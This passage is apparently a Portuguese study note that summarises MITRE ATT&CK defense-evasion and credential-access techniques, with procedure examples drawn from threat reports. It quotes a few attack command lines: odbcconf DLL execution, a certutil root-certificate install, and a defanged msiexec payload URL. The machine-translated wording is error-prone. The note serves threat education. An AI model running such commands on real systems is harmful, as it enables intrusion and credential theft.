.002 **Firmware de componentes:** Alguns adversários podem empregar meios sofisticados para comprometer componentes de computador e instalar firmware malicioso que executará código adversário fora do sistema operacional e do sistema principal de firmware ou BIOS. O firmware de componentes maliciosos poderia fornecer tanto um nível persistente de acesso a sistemas, apesar de potenciais falhas típicas para manter o acesso e as re-imagens em disco rígido, bem como uma maneira de escapar das defesas baseadas em software do host e verificações de integridade.

**REFERÊNCIA:** https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08064459/Equation_group_questions_and_answers.pdf

.003 **Rootkit:** Os Rootkits residem em uma camada abaixo do sistema operacional e podem dificultar a execução total da remediação, a menos que uma organização suspeita que um foi usado e pode agir de acordo. Um bootkit é uma variante de malware que modifica os setores de inicialização de um disco rígido, incluindo o Master Boot Record (MBR) e o Volume Boot Record (VBR)

**Exemplo de procedimento:** Um grupo de atacantes utilizaram phishing para implantação de rootkit conhecido como lojaz, ele reside dentro da memoria flash de um computador, isso permite que os atacantes mantenham uma presença persistente em uma máquina comprometida.

**REFERÊNCIA:** https://symantec-enterprise-blogs.security.com/blogs/election-security/apt28-espionage-military-government

T1218 **Execução binária de proxy assinada:** Os adversários podem contornar o processo e/ou as defesas baseadas em assinaturas, proxyizando a execução de conteúdo malicioso com binários assinados

.001 **Arquivo HTML compilado:** Para ocultar códigos maliciosos os adversários podem abusar de arquivos HTML compilado .chm.

**Exemplo de procedimento:** Tudo começa com ataque der phishing a vitima, pedindo para anrir uma conta no banco atacadi.

![image](https://user-images.githubusercontent.com/95362045/157689345-2428eb75-ac58-47ab-9243-718e5755e5bb.png)

O anexo é um arquivo Microsoft Compliled HTML help. é um formato que ajuda online proprietário da microsoft que consiste em uma coleção de páginas HTML. Esse arquivo são interativos e podem executar JS que redireciona a vítima ara uma URL externa depois de abrir o CHM 

**REFERÊNCIA:** https://securelist.com/the-silence/83009/

.002 **Painel de controle:** O binário binário de processo do Painel de Controle do Windows (controle.exe) lida com a execução de itens do Painel de Controle, que são utilitários que permitem aos usuários visualizar e ajustar as configurações do computador.

**Exemplo de procedimento:** Os adversários também podem renomear arquivos DLL maliciosos (.dll) com extensões de arquivo do Painel de Controle (.cpl) e registrá-los 

**REFERÊNCIA:** https://www.welivesecurity.com/wp-content/uploads/2020/06/ESET_InvisiMole.pdf 

.003 **CMSTP:** O CmSTP.exe (Microsoft Connection Manager Profile Installer) é um programa de linha de comando usado para instalar perfis de serviço do Gerenciador de Conexão. CMSTP.exe aceita um arquivo de informações de instalação (INF) como parâmetro e instala um perfil de serviço aproveitado para conexões de acesso remoto.

**Exemplo de procedimento:** Os adversários podem fornecer cmstp.exe com arquivos INF infectados com comandos maliciosos. CmSTP.exe também podem ser abusadas para ignorar o controle da conta do usuário e executar comandos arbitrários a partir de um INF malicioso através de uma interface COM auto-elevada.

**REFERÊNCIA:** https://www.mandiant.com/resources/iranian-threat-group-updates-ttps-in-spear-phishing-campaign

.004 **InstallUtil:** nstallUtil é um utilitário de linha de comando que permite a instalação e desinstalação de recursos executando componentes específicos do instalador especificados em binários.

**Exemplo de procedimento:** Mustang Panda usou para executar um encenador de farol malicioso.InstallUtil.exe : Os TTPs observados consistem nos seguintes: 

Uso de arquivo zip que contenha um arquivo ".lnk" (Windows Shortcut).

Utilização de truque de dupla extensão (exemplo.doc.lnk) para convencer os usuários a abrir o arquivo.

HTA (Aplicativo HTML) com VBScript incorporado no arquivo ".lnk"

O VBScript derruba cargas e abre um documento de isca ou PDF para o usuário.

Uso de cargas PlugX e Cobalt Strike.

**REFERÊNCIA:** https://www.anomali.com/blog/china-based-apt-mustang-panda-targets-minority-groups-public-and-private-sector-organizations

.005 **Mshta:** Os adversários podem abusar .exe de mshta para a execução por proxy de arquivos .hta maliciosos e Javascript ou VBScript através de um utilitário Windows confiável. Mshta.exe é um utilitário que executa arquivos HTA (Microsoft HTML Applications, aplicativos HTML). HTAs são aplicativos autônomos que executam usando os mesmos modelos e tecnologias do Internet Explorer, mas fora do navegador.

**Exemplo de procedimento:** 	APT32 usou .exe mshta para execução de código: A penetração começou via engenharia social, vítimas receberam e-mails de spear-phishing contendo conteúdos e documentos do word armados, são usados JS como script para baixar um Cobalt strik. 

**REFERÊNCIA:** https://www.cybereason.com/blog/operation-cobalt-kitty-apt

.007 ** Msiexec:** Msiexec.exe é o utilitário de linha de comando do Windows Installer e, portanto, é comumente associado à execução de pacotes de instalação (.msi). .exe Msiexec é assinada digitalmente pela Microsoft.

**Exemplo de procedimento:** Os adversários podem abusar .exe msiexec para lançar arquivos MSI locais ou acessíveis à rede. Msiexec.exe também pode executar DLLs. Uma vez que é assinado e nativo em sistemas Windows, o msiexec.exe pode ser usado para contornar soluções de controle de aplicativos que não explicam seu potencial abuso. A execução .exe Msiexec também pode ser elevada a privilégios do SISTEMA se a política estiver habilitada.

**REFERÊNCIA:** https://docs.microsoft.com/en-us/windows/win32/msi/alwaysinstallelevated

.008 **Odbcconf:** O .exe Odbcconf é um utilitário Windows que permite configurar drivers de conectividade de banco de dados aberto (ODBC) e nomes de origem de dados. O .exe Odbcconf é assinado digitalmente pela Microsoft.

**EXEMPLO DE PROCEDIMENTO:** Os adversários podem abusar .exe odbcconf para contornar soluções de controle de aplicativos que não explicam seu potencial abuso. Semelhante ao Regsvr32, o .exe odbcconf tem uma bandeira que pode ser mal utilizada para executar DLLs (ex: ). REGSVRodbcconf.exe /S /A {REGSVR "C:\Users\Public\file.dll"}

**REFERÊNCIA:** https://www.trendmicro.com/en_us/research/17/k/cobalt-spam-runs-use-macros-cve-2017-8759-exploit.html

.009 **Regsvcs/Regasm:** Regsvcs e Regasm são utilitários de linha de comando do Windows que são usados para registrar montagens com (Modelo de Objeto de Componentes .NET). Ambos são assinados digitalmente pela Microsoft.

**Exemplo de procedimento:** Agente Tesla deixou a RegAsm.exe em sistemas para a realização de atividades maliciosas.
o principal mecanismo de entrega do Agente Tesla é o e-mail (mensagens de phishing). Os atacantes são muitas vezes oportunos com suas iscas de engenharia social, e a pandemia atual não está fora dos limites para os atacantes. Nos últimos meses, os atacantes têm sido observados espalhando o Agente Tesla através de mensagens temáticas COVID, muitas vezes disfarçadas de informações ou atualizações da OMS (Organização Mundial da Saúde) O Agente Tesla agora é capaz de coletar dados de configuração e credenciais de vários clientes comuns de VPN, clientes FTP e E-mail e Navegadores da Web. O malware tem a capacidade de extrair credenciais do registro, bem como arquivos de configuração ou suporte relacionados. Nossa análise de uma amostra das amostras atuais do Agente Tesla revela a seguinte lista de softwares direcionados

**REFERÊNCIA:** https://www.sentinelone.com/labs/agent-tesla-old-rat-uses-new-tricks-to-stay-on-top/

.010 **Regsvr32:** Regsvr32.exe é um programa de linha de comando usado para registrar e não registrar controles de vinculação e incorporação de objetos, incluindo bibliotecas de links dinâmicos (DLLs), em sistemas Windows. Regsvr32.exe também é um binário assinado pela Microsoft. 

**Exemplo de procedimento:** O AppleSeed pode chamar regsvr32.exe para execução: Após arquivos em PDF ser enviado via phishing, o arquivo cintinha um JS que finge ser um arquivo PDF que contem blobs codificados base64. No final, o arquivo PDF chamará Wscript.Shell.Run e a carga appleSeed executada através do PowerShell ligando para regsvr32.exe. Chamando regsvr32.exe para executar um DLL registra-o como um servidor que chama automaticamente a função de exportação DLL que foi chamada de DllRegisterServer.

**REFERÊNCIA:** https://blog.malwarebytes.com/threat-intelligence/2021/06/kimsuky-apt-continues-to-target-south-korean-government-using-appleseed-backdoor/

.011 **Rundll32:** Os atacantes podem abusar do rundll32.exe à execução por proxy de código malicioso. O uso Rundll32 pode evitar acionar ferramentas de segurança que podem não monitorar a execução do processo rundll32.exe, o mesmo também é usado para executar arquivos de itens do painel de controle.

**Exemplo de procedimento:** Os adversários também podem tentar obscurecer o código malicioso da análise, abusando da maneira como rundll32.exe carrega nomes de funções DLL.

**REFERêNCIA:** https://www.mandiant.com/resources/phished-at-the-request-of-counsel

.012 **Verclsídeo:** O Verclsid.exe é conhecido como o Host de Verificação CLSID de extensão e é responsável por verificar cada extensão de shell antes de serem usados pelo Windows Explorer ou pelo Windows Shell.

**REFERÊNCIA:** https://redcanary.com/blog/verclsid-exe-threat-detection/

.013 **Mavinject:** Mavinject.exe é o Microsoft Application Virtualization Injector, um utilitário Windows que pode injetar código em processos externos como parte do Aplicativo de Virtualização de Aplicativos da Microsoft (App-V)

**Exemplo de procedimento:** Os adversários podem abusar do mavinject.exe para injetar DLLs maliciosos em processos de execução (ou seja, Injeção de Biblioteca de link dinâmico), permitindo a execução arbitrária de código.  Como o mavinject.exe é assinado digitalmente pela Microsoft, a execução de proxying através deste método pode evitar a detecção por produtos de segurança porque a execução é mascarada em um processo legítimo.

**REFERÊNCIA:** https://lolbas-project.github.io/lolbas/Binaries/Mavinject/

.014 **MMC:**  MMC, é um binário windows assinado e é usado de várias maneiras em seu GUI ou em um prompt de comando. v20 O MMC pode ser usado para criar, abrir e salvar consoles personalizados que contenham ferramentas administrativas criadas pela Microsoft, chamadas snap-ins.

**Exemplo de procedimento:** Os adversários também podem abusar do MMC para executar arquivos .msc maliciosos. Por exemplo, os adversários podem primeiro criar uma sub-chave CLSID (Identificação de Classe) de registro malicioso, que identifica exclusivamente um objeto de classe Modelo de Objeto componente.

T1216 **Execução de proxy de script assinado:** Os adversários podem usar scripts assinados com certificados confiáveis para execução por proxy de arquivos maliciosos. Vários scripts assinados pela Microsoft que são padrão nas instalações do Windows podem ser usados para a execução por proxy de outros arquivos

.001 **PubPrn:** PubPrn.vbs é um script Visual Basic que publica uma impressora para Serviços de Domínio do Active Directory. O script é assinado pela Microsoft e é comumente executado através do Windows Command Shell via .

**REFERÊNCIA:** https://www.ired.team/offensive-security/code-execution/t1216-signed-script-ce

T1553 **Subverte controles de confiança:** Os atacantes podem minar os controles de segurança que alertarão os usuários sobre atividades não confiáveis. Os adversários podem tentar subverter esses mecanismos de confiança. O método que os adversários usam dependerá do mecanismo específico que eles procuram subverter.

**REFERÊNCIA:** https://community.broadcom.com/symantecenterprise/communities/community-home/librarydocuments/viewdocument?DocumentKey=237adfd4-eb62-43b4-8424-78ea5f427b80&CommunityKey=1ecf5f55-9545-44d6-b0f4-4e4a7f5f5e68&tab=librarydocuments

.001 **Gatekeeper Bypass:** Os adversários podem modificar atributos de arquivo que significam que os programas são de fontes não confiáveis para subverter os controles do Gatekeeper no macOS. A bandeira de quarentena é um sistema de opt-in e não imposto pelo macOS. Se um aplicativo optar por entrar, um arquivo baixado da Internet receberá uma bandeira de quarentena antes de ser salvo em disco.

**Exemplo de procedimento:** OSX_OCEANLOTUS. D usa o comando para remover o atributo de arquivo de quarentena usado pelas verificações gatekeeper e notarization : A amostra chega como um aplicativo empacotado em um arquivo Zip. Ele usa o ícone para um arquivo de documento do Word como um disfarce, tentando passar-se como um arquivo de documento legítimo.

![image](https://user-images.githubusercontent.com/95362045/157884122-42557070-fb9c-47bc-b825-c4435c4d7914.png)

Outra técnica que usa para evitar a detecção é adicionar caracteres especiais ao seu nome de pacote de aplicativos. Quando um usuário procura a pasta de doc falsa através do aplicativo macOS Finder ou da linha de comando terminal, o nome da pasta mostra "ALL tim nha Chi Ngoc Canada.doc" ("tìm nhà Chị Ngěc" significa "encontrar a casa da Sra. Ngoc"). No entanto, verificar o arquivo Zip original que contém a pasta mostra 3 bytes inesperados entre "." e "doc".

![image](https://user-images.githubusercontent.com/95362045/157884284-4e866b99-bbe7-49b9-9d10-6753fd076dc6.png)

**REFERÊNCIA:** https://www.trendmicro.com/en_us/research/20/k/new-macos-backdoor-connected-to-oceanlotus-surfaces.html

.002 **Assinatura de código:** A assinatura de código fornece um nível de autenticidade em um binário do desenvolvedor e uma garantia de que o binário não foi adulterado.

**REFERÊNCIA:** https://www.cybereason.com/blog/dropping-anchor-from-a-trickbot-infection-to-the-discovery-of-the-anchor-malware

.003 **Sequestro de provedor de SIP e Trust:** Os adversários podem adulterar os componentes do SIP e do provedor de confiança para enganar o sistema operacional e as ferramentas de controle de aplicativos ao realizar verificações de validação de assinaturas. No modo de usuário, o Windows Authenticode [1] as assinaturas digitais são usadas para verificar a origem e integridade de um arquivo, variáveis que podem ser usadas para estabelecer confiança no código assinado (ex: um driver com uma assinatura Microsoft válida pode ser tratado como seguro)

**Exemplo de procedimento:**  Os adversários podem sequestrar componentes do SIP e do provedor de confiança para enganar o sistema operacional e as ferramentas de controle de aplicativos para classificar o código malicioso (ou qualquer) conforme assinado por: 

**REFERÊNCIA:** https://specterops.io/assets/resources/SpecterOps_Subverting_Trust_in_Windows.pdf

.004 **Instalar certificado raiz:**  Os certificados radiculares são usados na criptografia de chave pública para identificar uma autoridade de certificado raiz (CA). Quando um certificado raiz é instalado, o sistema ou aplicativo confiará em certificados na cadeia de confiança da raiz que foram assinados pelo certificado raiz.

**Exemplo de procedimento:** o certutil pode ser usado para instalar certificados raiz do navegador como um precursor para realizar o Adversário no Meio entre conexões a sites bancários. Exemplo de comando: .certutil -addstore -f -user ROOT ProgramData\cert512121.der

**REFERÊNCIA:** https://unit42.paloaltonetworks.com/retefe-banking-trojan-targets-sweden-switzerland-and-japan/

.005 **Mark-of-the-Web Bypass:**  No Windows, quando os arquivos são baixados da Internet, eles são marcados com um ADS (Alternate Data Stream, stream de dados alternativo) oculto com um valor específico conhecido como MOTW.

**Exemplo de procedimento:** Os adversários podem abusar de arquivos de contêineres, como formatos de arquivo compactados/arquivamento (.arj, .gzip) e/ou imagens de disco (.iso, .vhd) para fornecer cargas malicios. O TA505 usou arquivos .iso para implantar arquivos .lnk maliciosos.: E-mails com anexos ISO era enviado para produzir infecções bem sucedidas dada a técnica incomum de entrega de malware. E-mails com um anexo . A imagem ISO é uma . Arquivo LNK que usa msiexec de linha de comando para executar um arquivo MSI a partir de uma URL como hxxp://139[.] 180[.] 195[.] 36/pm2.

![image](https://user-images.githubusercontent.com/95362045/157924866-b38801e2-e408-4935-830f-84111f9b0d8b.png)
![image](https://user-images.githubusercontent.com/95362045/157924878-01b8ce2b-f757-4c80-95e3-08166ccbf195.png)

**REFERÊNCIA:** https://www.trendmicro.com/en_us/research/19/h/ta505-at-it-again-variety-is-the-spice-of-servhelper-and-flawedammyy.html

.006 **Modificação da política de assinatura de código ** A assinatura de código fornece um nível de autenticidade em um programa de um desenvolvedor e uma garantia de que o programa não foi adulterado. Os controles de segurança podem incluir mecanismos de execução para garantir que apenas o código assinado e válido possa ser executado em um sistema operacional.

**Exemplo de procedimento:** Os adversários podem modificar as políticas de assinatura de código de várias maneiras, incluindo através do uso de utilitários de linha de comando ou GUI, Alterar o registro, reiniciar o computador em um modo de depuração/recuperação ou alterar o valor das variáveis na memória do kernel.

**REFERÊNCIA:** https://docs.microsoft.com/en-us/windows-hardware/drivers/install/the-testsigning-boot-configuration-option

T1221 **Injeção de modelo:** Os adversários podem criar ou modificar referências em modelos de documentos do Office para ocultar códigos maliciosos ou forçar tentativas de autenticação. A especificação OOXML (Office Open XML) da Microsoft define um formato baseado em XML para documentos do Office (.docx, xlsx, .pptx) para substituir formatos binários mais antigos (.doc, .xls .ppt). 

**Exemplo de procedimento:** O APT28 usou documentos do Microsoft Word armados abusando da função de modelo remoto para recuperar uma macro maliciosa:  Nesta campanha, o grupo Sofacy parece ter confiado fortemente em nomes de arquivos para atrair as vítimas para lançar os documentos armados. Os nomes dos arquivos variavam de tópicos aludindo ao Brexit, o acidente da Lion Air e recentes ataques de foguetes em Israel.  Ao abrir o documento, ele aproveitou a capacidade do Microsoft Word de recuperar um modelo remoto para, em seguida, carregar um documento de macro malicioso, como visto na Figura 4.  Em seguida, a vítima verá um prompt para Habilitar conteúdo como em qualquer documento macro malicioso, como visto na Figura 5. Se o servidor C2 não estiver ativo neste momento, o download falhará e a vítima não receberá um prompt para habilitar conteúdo, pois nenhuma macro é baixada.

**REFERÊNCIA:** https://unit42.paloaltonetworks.com/dear-joohn-sofacy-groups-global-campaign/

T1205 **Sinalização de tráfego:** A sinalização de tráfego envolve o uso de um valor ou sequência mágica que deve ser enviado a um sistema para acionar uma resposta especial, como abrir uma porta fechada ou executar uma tarefa maliciosa. Isso pode assumir a forma de enviar uma série de pacotes com certas características antes que uma porta seja aberta que o adversário possa usar para comando e controle.

**Exemplo de procedimento:**O caos fornece um shell reverso é acionado após o recebimento de um pacote com uma sequência especial, enviado para qualquer porta.: um backdoor que gera um shell reverso totalmente criptografado. um invasor violou um  sistema monitorados por credenciais SSH que forçam o bruto usando dois IPs conhecidos por fazer parte da rede TOR:o invasor primeiro desativou o histórico de registro e, em seguida, verificou o binário SSHD, bem como a existência de certos arquivos, como o /usr/include/gpm2.h. O objetivo disso era garantir que a máquina violada ainda não tenha sido infectada por outra pessoa.
Para a segunda fase, o atacante baixou um arquivo que fingia ser um jpg de http://xxx.xxx.xxx.29/cs/default2.jpg. Na verdade, o arquivo era um arquivo .tar e a extensão .jpg era para torná-lo mais legítimo em possíveis arquivos de log ou capturas de pacotes. O arquivo de piche continha:

**REFERÊNCIA:** https://www.gosecure.net/blog/2018/02/14/chaos-a-stolen-backdoor-rising/

.001 **Port Knocking:** Para habilitar uma porta, um adversário envia uma série de tentativas de conexões para uma sequência predefinida de portas fechadas. Depois que a sequência é concluída, a abertura de uma porta é frequentemente realizada pelo firewall baseado no host, mas também pode ser implementada por software personalizado.

**Exemplo de procedimento:** O PROMETHIUM usou um script que configura o serviço e o firewall para aceitar apenas conexões C2 de sistemas que usam uma sequência especificada de portas knock. 

**REFERÊNCIA:** https://www.bitdefender.com/files/News/CaseStudies/study/353/Bitdefender-Whitepaper-StrongPity-APT.pdf

T1127 **Execução de proxy de utilitários de desenvolvedor confiáveis** Os adversários podem aproveitar os utilitários de desenvolvedor confiáveis para a execução por proxy de cargas maliciosas. Existem muitas utilidades usadas para tarefas relacionadas ao desenvolvimento de software que podem ser usadas para executar códigos de várias formas para auxiliar no desenvolvimento, depuração e engenharia reversa.

.001 **MSBuild:**  MSBuild.exe (Microsoft Build Engine) é uma plataforma de construção de software usada pelo Visual Studio. Ele lida com arquivos de projeto formatados xML que definem requisitos para carregar e construir várias plataformas e configurações.

**REFERÊNCIA:** https://blog.talosintelligence.com/2019/06/frankenstein-campaign.html

T1535 **Regiões de nuvens não-reutilizadas/sem suporte:**  O acesso geralmente é obtido através de contas comprometedoras usadas para gerenciar a infraestrutura em nuvem. Os provedores de serviços em nuvem geralmente fornecem infraestrutura em todo o mundo, a fim de melhorar o desempenho, fornecer redundância e permitir que os clientes atendam aos requisitos de conformidade.

**Exemplo de procedimento:** Um exemplo de uso adversário de regiões AWS não utilizadas é minerar criptomoedas através do Sequestro de Recursos, que pode custar às organizações quantias substanciais de dinheiro ao longo do tempo, dependendo do poder de processamento usado

TA0006 **ACESSO CREDENCIAL:** O adversário está tentando roubar nomes de contas e senhas.

O Acesso credencial consiste em técnicas para roubar credenciais, como nomes de contas e senhas. As técnicas utilizadas para obter credenciais incluem keylogging ou dumping de credenciais. O uso de credenciais legítimas pode dar aos adversários acesso a sistemas, torná-los mais difíceis de detectar e fornecer a oportunidade de criar mais contas para ajudar a alcançar seus objetivos.

T1557 **Adversário no Meio:** Os adversários podem tentar se posicionar entre dois ou mais dispositivos em rede usando uma técnica adversária no meio (AiTM) para suportar comportamentos de acompanhamento, como o Sniffing de Rede ou a Manipulação de Dados Transmitidos.os adversários podem forçar um dispositivo a se comunicar através de um sistema controlado por adversários para que eles possam coletar informações ou realizar ações adicionais.

**Exemplo de procedimento:** Dok proxies tráfego web para potencialmente monitorar e alterar o tráfego HTTP(S) da vítima: Um malware se instala em um servidor proxy malicioso para o Man in the middle a fim de capturar credenciais bancárias das vítimas e manipular tráfego. Esse malware é entregue por email via phishing. Anexado aos e-mails maliciosos, está um arquivo zip (Dokument.zip), que contém o malware. Os usuários que ingenuamente acreditam nas instruções no e-mail e unzip Dokument.zip, encontrarão um único arquivo chamado Dokument:

**REFERÊNCIA:**  https://objective-see.com/blog/blog_0x25.html#Dok

.001 **Envenenamento por LLMNR/NBT-NS e relé SMB:** Link-Local Multicast Name Resolution (LLMNR) e NetBIOS Name Service (NBT-NS) são componentes do Microsoft Windows que servem como métodos alternativos de identificação do host. O LLMNR é baseado no formato DNS (Domain Name System, sistema de nomes de domínio) e permite que os hosts no mesmo link local executem a resolução do nome para outros hosts. O NBT-NS identifica sistemas em uma rede local pelo nome NetBIOS.

**Exemplo de procedimento:** Wizard Spider usou os cmdlets Invoke-Inveigh PowerShell, provavelmente para envenenamento por serviço de nome: A distribuição foi feita via phishing contendo um link que redireciona para o google docs controlado pelo atacante, esse documento contém um link hospedado para uma carga com malware, Uma vez que o carregador e o backdoor foram executados no hospedeiro inicial da vítima, os atores usaram este backdoor inicial para baixar cargas POWERTRICK e/ou Cobalt Strike BEACON para estabelecer uma base.

**REFERÊNCIA:** https://www.mandiant.com/resources/kegtap-and-singlemalt-with-a-ransomware-chaser

.002 **Envenenamento por cache ARP:**  Os adversários podem envenenar caches ARP (Address Resolution Protocol, protocolo de resolução de endereços) para se posicionarem entre a comunicação de dois ou mais dispositivos em rede. O protocolo ARP é usado para resolver endereços IPv4 para vincular endereços de camada, como um endereço MAC (Media Access Control control, controle de acesso à mídia).

**Exemplo de procedimento:** Os adversários podem usar o envenenamento por cache ARP como um meio de interceptar o tráfego de rede. Essa atividade pode ser usada para coletar e/ou retransmitir dados, como credenciais, especialmente aquelas enviadas por meio de um protocolo inseguro e não criptografado. 

**REFERÊNCIA:** https://web.archive.org/web/20200302085133/https://www.cylance.com/content/dam/cylance/pages/operation-cleaver/Cylance_Operation_Cleaver_Report.pdf

T1110 **Força Bruta:** Os adversários podem usar técnicas de força bruta para obter acesso a contas quando as senhas são desconhecidas ou quando as hashes de senha são obtidas. Sem o conhecimento da senha de uma conta ou conjunto de contas, um adversário pode adivinhar sistematicamente a senha usando um mecanismo repetitivo ou iterativo.

**Exemplo de procedimento:** O APT28 pode realizar ataques de força bruta para obter credenciais. Pawn Storm compromete muitas contas de e-mail através de ataques de força bruta em serviços voltados à internet, como e-mail, LDAP, Microsoft Autodiscover, SMB e SQL. a Pawn Storm também enviou sondas UDP para servidores LDAP em todo o mundo a partir de um de seus endereços IP dedicados

**REFERÊNCIA:** https://www.trendmicro.com/en_us/research/20/l/pawn-storm-lack-of-sophistication-as-a-strategy.html

.001 **Adivinhação de senhas:** Sem o conhecimento da senha de uma conta, um adversário pode optar por adivinhar sistematicamente a senha usando um mecanismo repetitivo ou iterativo. Um adversário pode adivinhar credenciais de login sem conhecimento prévio de senhas do sistema ou ambiente durante uma operação usando uma lista de senhas comuns. 

**Exemplo de procedimento:** O Emotet foi observado usando uma lista codificada de senhas para forçar contas de usuário

**REFERÊNCIA:** https://service.malwarebytes.com/hc/en-us/signin?return_to=https%3A%2F%2Fservice.malwarebytes.com%2Fhc%2Fen-us%2Farticles%2F4413817228947

.002 **Quebra de senha:** Os adversários podem usar a quebra de senha para tentar recuperar credenciais utilizáveis, como senhas de texto simples, quando material de credencial, como hashes de senha, são obtidos.

**Exemplo de procedimento:**  realizou ataques de força bruta de senha na conta de administração local usando o Hydra

**REFERÊNCIA:** https://content.fireeye.com/apt-41/rpt-apt41

.003 **Pulverização de senhas:**  A pulverização de senhas usa uma senha (por exemplo, 'Password01'), ou uma pequena lista de senhas comumente usadas, que podem corresponder à política de complexidade do domínio. Logins são tentados com essa senha contra muitas contas diferentes em uma rede para evitar bloqueios de contas que normalmente ocorreriam quando forçam uma única conta com muitas senhas. 

**Exemplo de procedimento:** 	O malware do Lazarus Group tenta se conectar às ações do Windows para o movimento lateral usando uma lista gerada de nomes de usuário, que giram em torno de permutações do administrador de nome de usuário e senhas fracas.

**REFERÊNCIA:** https://www.operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Report.pdf

.004 **Recheio de credencial:** O recheio de credenciais é uma opção arriscada porque pode causar inúmeras falhas de autenticação e bloqueios de contas, dependendo das políticas de falha de login da organização.  Ocasionalmente, um grande número de pares de nomes de usuário e senhas são despejados on-line quando um site ou serviço é comprometido e as credenciais da conta de usuário acessadas.

**Exemplo de procedimento:** Esse adversário começa com a obtenção de nomes de usuário e senhas da vítima de violações anteriores. Essas credenciais são usadas em um recheio de credenciais ou spray de senha contra os serviços remotos da vítima, como webmail ou outros serviços de correio acessíveis à Internet. Após a obtenção de uma conta válida, eles usam essa conta para acessar a VPN, Citrix ou outro serviço remoto da vítima que permita o acesso à rede da vítima. 

**REFERÊNCIA:** https://research.nccgroup.com/2021/01/12/abusing-cloud-services-to-fly-under-the-radar/

T1555 **Credenciais de Lojas de Senhas:** . As senhas são armazenadas em vários locais de um sistema, dependendo do sistema operacional ou aplicativo que detém as credenciais. Existem também aplicativos específicos que armazenam senhas para facilitar a gestão e manutenção dos usuários. Uma vez obtidas credenciais, elas podem ser usadas para realizar movimentos laterais e acessar informações restritas.

**Exemplo de procedimento:** Os alvos são abordados com e-mails de spearphishing que contêm um link para um arquivo ZIP hospedado no Google Drive. Esse arquivo contém vários arquivos LNK (também conhecidos como atalho) que extraem e executam um componente JavaScript malicioso, enquanto exibem um documento de isca. Esses arquivos de atalho têm "extensões duplas" para tentar enganar o usuário para abri-los, pensando que são documentos ou imagens benignas (no Windows, extensões de arquivos para tipos de arquivos conhecidos são ocultas por padrão).

**REFERÊNCIA:** https://www.welivesecurity.com/2020/07/09/more-evil-deep-look-evilnum-toolset/

.001 **Chaveiro:** Os chaveiros são a maneira incorporada do macOS de acompanhar as senhas e credenciais dos usuários para muitos serviços e recursos, como senhas WiFi, sites, notas seguras, certificados e Kerberos

**Exemplo de procedimento:** O iKitten coleta os chaveiros no sistema. As infecções do MacDownloader começam com um e-mail de phishing. Um site de spearphishing foi previamente acreditado para ser mantido por atores iranianos para espalhar malware do Windows, o site contém um link para o que pretende ser um plugin necessário para o reproduto de vídeo; Adobe Flash. É claro que isso se conecta não a uma versão legítima do Flash, mas "ou malware do Windows ou Mac baseado no sistema operacional detectado". Se o usuário for enganado a executar e baixar o aplicativo 'flash player', ele será infectado pelo MacDownloader:

**REFERÊNCIA:** https://objective-see.com/blog/blog_0x25.html#MacDownloader

.002 **Memória securityd:** Um adversário pode obter acesso raiz (permitindo que eles leiam a memória do securityd), então eles podem digitalizar através da memória para encontrar a sequência correta de chaves em relativamente poucas tentativas de descriptografar o chaveiro logon do usuário. Isso fornece ao adversário todas as senhas de texto simples para usuários, WiFi, correio, navegadores, certificados, notas seguras, etc

.003 **Credenciais de Navegadores da Web:** Os navegadores da Web geralmente salvam credenciais, como nomes de usuário de sites e senhas, de modo que eles não precisam ser inseridos manualmente no futuro. Os navegadores da Web normalmente armazenam as credenciais em um formato criptografado dentro de uma loja de credenciais; no entanto, existem métodos para extrair credenciais de texto simples de navegadores da Web.

**Exemplo de procedimento:** Agente Tesla pode coletar credenciais de vários navegadore: Depois da campanha de spearphishing e depois de executar os arquivos .zip contidos no mesmo, roda um executavel que deixará um spyware que coletará informações confidenciais e credenciais.

**REFERÊNCIA:** https://www.bitdefender.com/blog/labs/oil-gas-spearphishing-campaigns-drop-agent-tesla-spyware-in-advance-of-historic-opec-deal/

.004 **Gerenciador de credenciais do Windows:** O Gerenciador de Credenciais do Windows separa as credenciais do site das credenciais de aplicativos ou de rede em dois armários. Como parte das credenciais dos Navegadores da Web, as credenciais do Site Do Internet Explorer e do Microsoft Edge são gerenciadas pelo Gerenciador de Credenciais e são armazenadas no armário de credenciais da Web. As credenciais de aplicativos e de rede são armazenadas no armário de credenciais do Windows.

**Exemplo de procedimento:** Os adversários podem listar credenciais gerenciadas pelo Gerenciador de Credenciais do Windows através de vários mecanismos. é um executável nativo do Windows que pode ser usado para enumerar credenciais armazenadas no Armário de Credencial através de uma interface de linha de comando

**REFERÊNCIA:** https://docs.microsoft.com/en-us/windows/win32/api/wincred/nf-wincred-credenumeratea

.005 **Gerenciadores de senhas:** Os gerenciadores de senhas são aplicativos projetados para armazenar credenciais de usuário, normalmente em um banco de dados criptografado. As credenciais são normalmente acessíveis depois que um usuário fornece uma senha mestre que desbloqueia o banco de dados. Depois que o banco de dados for desbloqueado, essas credenciais podem ser copiadas para a memória.

**Exemplo de procedimento:** Fox Kitten usou scripts para acessar informações credenciais do banco de dados KeePass

**REFERÊNCIA:** Fox Kitten usou scripts para acessar informações credenciais do banco de dados KeePass

T1212 **Exploração para acesso credencial:** A exploração de uma vulnerabilidade de software ocorre quando um adversário se aproveita de um erro de programação em um programa, serviço ou dentro do próprio software do sistema operacional ou do próprio kernel para executar código controlado por adversários. 

T1187 **Autenticação Forçada **O protocolo SMB (Server Message Block, bloco de mensagens do servidor) é comumente usado em redes Windows para autenticação e comunicação entre sistemas para acesso a recursos e compartilhamento de arquivos. Quando um sistema Windows tenta se conectar a um recurso SMB, ele tentará autenticar e enviar automaticamente informações de credenciais para o usuário atual para o sistema remoto. 

**Exemplo de procedimento:** Dragonfly 2.0 reuniu credenciais de usuário hashed sobre SMB usando anexos de spearphishing com links de recursos externos e modificando . Recursos de ícone de arquivo LNK para coletar credenciais de sistemas virtualizados.



**REFERÊNCIA:** https://www.cisa.gov/uscert/ncas/alerts/TA18-074A

T1606 **Forjar credenciais da Web:** Os adversários podem forjar materiais credenciais que podem ser usados para obter acesso a aplicativos web ou serviços de Internet. Aplicativos e serviços web (hospedados em ambientes SaaS em nuvem ou servidores locais) geralmente usam cookies de sessão, tokens ou outros materiais para autenticar e autorizar o acesso do usuário. Uma vez forjados, os adversários podem usar essas credenciais da Web para acessar recursos (ex: Use material de autenticação alternativa), que podem contornar mecanismos de proteção de multifatorial e outros mecanismos de proteção de autenticação.

.001 **Web Cookies:** Aplicativos e serviços web (hospedados em ambientes SaaS em nuvem ou servidores locais) geralmente usam cookies de sessão para autenticar e autorizar o acesso do usuário.

